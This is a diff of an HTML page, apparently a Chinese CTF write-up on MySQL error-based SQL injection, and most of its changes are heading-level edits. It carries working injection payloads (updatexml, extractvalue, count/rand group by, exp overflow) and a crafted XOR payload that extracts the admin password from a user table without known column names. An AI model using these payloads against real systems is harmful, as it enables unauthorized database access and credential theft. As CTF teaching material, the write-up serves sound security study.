@@ -219,23 +219,23 @@ window.onload=getCSS();
 </li>
 </ul>
 <p>所以我们构造Paylaod如下:</p>
-<h3 id="0-sql注入报错函数">0.) SQL注入报错函数</h3>
+<h2 id="0-sql注入报错函数">0.) SQL注入报错函数</h2>
 <p>报错注入<strong>只适用于没有自定义错误页面，或直接返回mysql报错信息的情况下</strong>，所需条件较为苛刻，但利用难度低。 以下都以获取user为例：</p>
-<h3 id="111-count-rand导致group-by报错">1.1.1. count()、rand()导致group by报错</h3>
-<h5 id="测试方法">测试方法</h5>
+<h2 id="111-count-rand导致group-by报错">1.1.1. count()、rand()导致group by报错</h2>
+<h4 id="测试方法">测试方法</h4>
 <pre><code class="language-sql">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
 </code></pre>
-<h3 id="112-updatexml报错">1.1.2. updatexml报错</h3>
-<h5 id="测试方法-2">测试方法</h5>
+<h2 id="112-updatexml报错">1.1.2. updatexml报错</h2>
+<h4 id="测试方法-2">测试方法</h4>
 <pre><code class="language-sql">and updatexml(1,concat(0x7e,user()),1)
 </code></pre>
-<h5 id="注意事项">注意事项</h5>
+<h4 id="注意事项">注意事项</h4>
 <p><strong>适用于MySQL 5.1.5及以后的版本</strong></p>
-<h3 id="113-extractvalue报错">1.1.3. extractvalue报错</h3>
-<h5 id="测试方法-3">测试方法</h5>
+<h2 id="113-extractvalue报错">1.1.3. extractvalue报错</h2>
+<h4 id="测试方法-3">测试方法</h4>
 <pre><code class="language-sql">and extractvalue(1,concat(0x7e,user()))
 </code></pre>
-<h5 id="注意事项-2">注意事项</h5>
+<h4 id="注意事项-2">注意事项</h4>
 <p>适用于MySQL 5.1.5及以后的版本</p>
 <h3 id="114-其他函数">1.1.4. 其他函数</h3>
 <h5 id="测试方法-4">测试方法</h5>
@@ -247,18 +247,15 @@ and linestring((select * from(select * from(select user())a)b))
 and multilinestring((select * from(select * from(select user())a)b))
 and exp(~(select * from(select user())a))
 </code></pre>
-<h3 id="1-分析一下通过异或来判断真假因为过滤or关键字不能查询information_schema表">1. ) 分析一下,通过异或来判断真假,因为过滤or关键字,不能查询information_schema表</h3>
+<p><strong>1). 分析一下,通过异或来判断真假,因为过滤or关键字,不能查询information_schema表</strong></p>
 <pre><code class="language-SQL">'^(select exp(~( 查询语句 )*18446744073709551615)))#&amp;password=admin
-
 </code></pre>
-<h4 id="2-而且不知道列名完成虚拟表构造查询虚拟表c-的-b列就是后面查询user表的密码">2.) 而且不知道列名,完成虚拟表构造,查询虚拟表c 的 b列就是,后面查询User表的密码</h4>
-<pre><code class="language-mysql">(select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) )
-
+<p>** 2).  而且不知道列名,完成虚拟表构造,查询虚拟表c 的 b列就是,后面查询User表的密码**</p>
+<pre><code class="language-SQL">(select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) )
 
 '^(select exp(~((select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) ))*18446744073709551615)))#&amp;password=admin
-
 </code></pre>
-<h3 id="3-最后注入得到密码进行后续操作得到flag">3) 最后注入得到密码,进行后续操作,得到Flag</h3>
+<p>** 3).  最后注入得到密码,进行后续操作,得到Flag**</p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
